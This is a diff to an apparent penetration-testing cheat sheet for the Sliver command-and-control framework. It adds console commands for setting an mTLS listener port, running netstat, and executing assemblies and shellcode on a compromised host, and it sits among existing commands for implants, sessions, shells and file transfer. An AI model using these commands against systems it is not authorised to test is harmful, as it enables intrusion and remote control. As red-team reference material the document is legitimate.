@@ -379,6 +379,7 @@ sliver > profiles generate --save /PATH/TO/BINARY beacon_win_default
 
 ```c
 sliver > mtls                                                             // Mutual Transport Layer Security
+sliver > mtls --lport <LPORT>                                             // Set MTLS port
 sliver > jobs                                                             // display current jobs
 sliver > implants                                                         // show all created implants
 sliver > sessions                                                         // display currently available sessions
@@ -388,12 +389,15 @@ sliver > sessions -k <ID>                                                 // kil
 sliver > upload //PATH/TO/LOCAL/FILE/<FILE> /PATH/TO/REMOTE/DIRECTORY     // upload a file
 sliver > download /PATH/TO/LOCAL/FILE/<FILE> /PATH/TO/REMOTE/DIRECTORY    // download a file
 sliver (NEARBY_LANGUAGE) > tasks                                          // show tasks
-sliver > tasks fetch 49ead4a9                                             // fetch a specific task
+sliver (NEARBY_LANGUAGE) > tasks fetch 49ead4a9                           // fetch a specific task
 sliver (NEARBY_LANGUAGE) > info                                           // provide session information
-sliver (NEARBY_LANGUAGE) > shell                                          // spawn a shell
+sliver (NEARBY_LANGUAGE) > shell                                          // spawn a shell (ctrl + d to get back)
+sliver (NEARBY_LANGUAGE) > netstat                                        // get network information
 sliver (NEARBY_LANGUAGE) > interactive                                    // interact with a session
 sliver (NEARBY_LANGUAGE) > screenshot                                     // create a screenshot
 sliver (NEARBY_LANGUAGE) > background                                     // background the session
+sliver (NEARBY_LANGUAGE) > execute-assembly <FILE>.exe uac                // execute a local binary
+sliver (NEARBY_LANGUAGE) > execute-shellcode <FILE>.bin uac               // execute a local binary
 ```
 
 ### Spawning new Sessions
